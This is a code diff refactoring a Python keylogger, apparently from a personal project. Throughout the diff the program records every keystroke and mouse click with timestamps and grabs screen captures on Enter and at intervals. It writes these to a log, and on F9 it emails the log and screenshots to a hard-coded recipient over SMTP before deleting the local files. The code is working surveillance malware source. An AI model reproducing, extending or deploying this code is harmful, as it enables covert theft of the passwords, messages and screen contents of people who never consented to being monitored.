@@ -9,7 +9,6 @@ SMTP_PASSWORD = "abcdefghijklmnop"  # 16 lowercase letters
 RECIPIENT = "recipient@gmail.com"
 CLICK_FREQ = 5
 
-
 # Site-packages
 import cv2, dxcam, pynput
 # Stdlibs
@@ -19,51 +18,60 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 
-def add_color(
-    s: str,
-    color: str
-  ) -> None:
-  return f"<font color=\"{color}\">{s}</font>"
+def log(s, color=None) -> None:
+  """
+  Write s to log file with specified color.
+  """
+  if color is None:
+    log_f.write(s)
+  else:
+    log_f.write(f"<font color=\"{color}\">{s}</font>")
+  log_f.flush()
 
 def get_time() -> str:
+  """
+  Get local time on computer.
+  """
   return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-def print_traceback() -> None:
+def log_traceback() -> None:
   s = "<br>===== ERROR OCCURRED =====<br>" \
     + traceback.format_exc().replace('\n', "<br>") \
     + "<br>==========<br>"
-  log_f.write(add_color(s, "red"))
+  log(s, "red")
 
 def get_screenshot() -> None:
   try:
     idx = len(os.listdir("./s_manifest"))
     img = cv2.cvtColor(cam.grab(), cv2.COLOR_BGR2RGB)
     cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
-    log_f.write(add_color(f"「s{idx}」 ", "blue"))
+    log(f"「s{idx}」 ", "blue")
   except:
-    print_traceback()
+    log_traceback()
 
 
-def keyboard_press(
-    key
-  ) -> None:
+def keyboard_press(key) -> None:
   """
-  on_press for keyboard listener.
+  on_press parameter for keyboard listener.
   """
   if isinstance(key, pynput.keyboard.KeyCode):
     k = key.char
     if key.vk in SPE_CTRL and SPE_CTRL[key.vk] != k:
-      k = add_color(f"「{SPE_CTRL[key.vk]}」", "green")
-    if k == '<':   k = "「less」"
-    elif k == '>': k = "「greater」"
+      log(f"「{SPE_CTRL[key.vk]}」", "green")
+    elif k == '<':
+      log("「less」")
+    elif k == '>':
+      log("「greater」")
+    else:
+      log(k)
   elif isinstance(key, pynput.keyboard.Key):
     k = key.name
     if k == "f9":
-      log_f.write(add_color(f"<br><br>「Keylogger terminated {get_time()}」 ", "blue"))
+      log(f"<br><br>「Keylogger terminated {get_time()}」 ", "blue")
       send_mail()
       os._exit(0)
     elif k == "enter":
-      k = add_color(f"<br>「↩ {get_time()}」", "blue")
+      log(f"<br>「↩ {get_time()}」", "blue")
       get_screenshot()
       return
     elif k == "backspace": k = '⌫'
@@ -71,10 +79,9 @@ def keyboard_press(
     elif k == "space":     k = '_'
     elif 'shift' in k:     k = '⬆'
     elif k == "tab":       k = '↹'
-    k = add_color(f"「{k}」", "green")
+    log(f"「{k}」", "green")
   else:
-    k = add_color("「Unhandled key」", "red")
-  log_f.write(k)
+    log("「Unhandled key」", "red")
 
 
 def mouse_click(
@@ -84,11 +91,11 @@ def mouse_click(
     pressed: bool
   ) -> None:
   """
-  on_click for mouse listener.
+  on_click parameter for mouse listener.
   """
   if not pressed:
     return
-  log_f.write(add_color(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue"))
+  log(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue")
   global click_count
   click_count = (click_count + 1) % CLICK_FREQ
   if click_count == 0:
@@ -138,7 +145,7 @@ def send_mail() -> None:
     shutil.rmtree("./s_manifest", ignore_errors=True)
 
   except:
-    print_traceback()
+    log_traceback()
 
 
 if __name__ == "__main__":
@@ -156,7 +163,7 @@ if __name__ == "__main__":
     os.mkdir("./s_manifest")
   cam = dxcam.create()
   log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
-  log_f.write(add_color(f"<br><br>「Keylogger started {get_time()}」<br>", "blue"))
+  log(f"<br><br>「Keylogger started {get_time()}」<br>", "blue")
   click_count = 0
 
   # Create threads
